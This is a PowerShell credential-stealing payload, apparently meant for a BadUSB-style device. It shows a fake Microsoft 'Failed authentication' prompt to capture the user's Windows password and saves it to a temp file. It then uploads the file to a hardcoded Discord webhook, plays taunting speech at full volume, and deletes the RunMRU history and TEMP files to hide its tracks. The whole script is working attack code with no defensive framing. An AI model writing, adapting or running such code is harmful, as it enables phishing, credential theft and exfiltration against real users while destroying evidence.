


$FileName = "User-Creds.txt"
 



function Get-Creds {
do{
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
   if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password)) {
    [System.Windows.Forms.MessageBox]::Show("Invalid Password")
    Get-Creds
}
$creds = $cred.GetNetworkCredential() | fl
return $creds
  # ...

  $done = $true
} until ($done)

}

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = 'https://discord.com/api/webhooks/1184838069740896326/B30LAh5X9NkQ111endVELXK2MBQRblzduqnE2tcSjRhPXn3dEnLCrUp-5hjj6mVGIYEk'

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}






function Pause-Script{
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}



function Caps-Off {
Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

#If true, toggle CapsLock key, to ensure that the script doesn't fail
if ($caps -eq $true){

$key = New-Object -ComObject WScript.Shell
$key.SendKeys('{CapsLock}')
}
}





Pause-Script

Caps-Off

Add-Type -AssemblyName System.Windows.Forms

[System.Windows.Forms.MessageBox]::Show("Failed authentication. Please authenticate your Microsoft Account")

$creds = Get-Creds



echo $creds >> $env:TMP\$FileName

Upload-Discord -file $env:TMP\User-Creds.txt

Start-Sleep -s 3

# Sets Volume to max level

$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}

# Sets up speech module 

$s=New-Object -ComObject SAPI.SpVoice
$s.Rate = -3
$s.Speak("Thank you for your password")
$s.Speak("Enjoy the rest of your life")
$s.Speak("or")
$s.Speak("whats left")
$s.Speak("lololololololololololololololololololololololololololololol")





reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue








